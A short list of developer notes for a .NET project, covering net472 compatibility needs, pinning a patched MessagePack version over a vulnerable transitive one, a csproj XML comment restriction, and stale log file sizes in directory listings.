- **net472** needs `Microsoft.Bcl.AsyncInterfaces` for IAsyncDisposable/IAsyncEnumerable, and its `IsNullOrEmpty` lacks `[NotNullWhen]` (use explicit null checks for 0 warnings). Pin **`MessagePack` 2.5.301** over StreamJsonRpc's vulnerable transitive 2.5.198.
- **XML csproj comments can't contain `--`.**
- **A log file held open by a running process shows a stale size in dir listings** — open it before declaring a logging bug, or an "empty acp.log" is diagnosed that is not empty.
